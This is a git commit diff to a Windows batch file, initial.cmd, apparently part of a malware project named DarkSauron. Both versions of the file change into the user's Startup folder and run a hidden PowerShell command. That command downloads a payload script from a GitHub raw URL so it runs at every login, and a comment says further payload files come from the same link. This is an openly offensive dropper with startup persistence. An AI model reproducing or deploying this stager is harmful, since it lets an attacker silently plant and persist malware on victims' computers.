02bb65c7f9c2cdb4646f3c51630806657683a9e6
knightcoder77 <langehmanik@gmail.com>
2026-01-11 17:10:58 +0530

    updated one

--- initial.cmd
+++ initial.cmd
@@ -4,13 +4,13 @@
 
 @REM variables
 set  "INITIALPATH=%cd%"
-set  "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
+set  "STARTUP=C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 
 @REM move into startup directory
 cd %STARTUP%
 
 @REM write payloads to startup
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest  -Uri https://raw.githubusercontent.com/knightcoder77/DarkSauron/main/files/wget.cmd -OutFile wget.cmd"
+powershell  -windowstyle hidden "Invoke-WebRequest  -Uri https://raw.githubusercontent.com/knightcoder77/DarkSauron/main/files/wget.cmd -OutFile wget.cmd"
 @rem change the  url of the above because this is  the only file we gonna use to run the paylaod thne the remaining files will download from the above link see the vide at he time eriod 2:06:00
 
 
